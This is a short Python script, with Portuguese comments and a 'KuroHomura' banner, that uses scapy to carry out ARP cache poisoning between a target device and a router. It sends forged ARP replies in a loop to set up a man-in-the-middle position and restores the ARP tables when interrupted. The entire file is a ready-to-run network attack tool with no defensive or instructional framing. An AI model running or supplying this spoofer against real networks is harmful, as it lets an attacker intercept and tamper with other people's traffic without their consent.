import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # Criando resposta ARP falsa: "Eu sou o IP X e meu MAC é este"
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

try:
    target_ip = sys.argv[1] # IP do Alvo (ex: Windows/Celular)
    gateway_ip = sys.argv[2] # IP do Roteador
    sent_packets_count = 0
    print(f"🔥 [KuroHomura] Iniciando Poisoning entre {target_ip} e {gateway_ip}...")
    
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print(f"\r[+] Pacotes enviados: {sent_packets_count}", end="")
        time.sleep(2)
except IndexError:
    print("Uso: sudo python3 kuro_spoofer.py <IP_ALVO> <IP_ROTEADOR>")
except KeyboardInterrupt:
    print("\n[!] Detectado Ctrl+C. Restaurando tabelas ARP... Aguarde.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("✅ Tabelas restauradas. Saindo.")
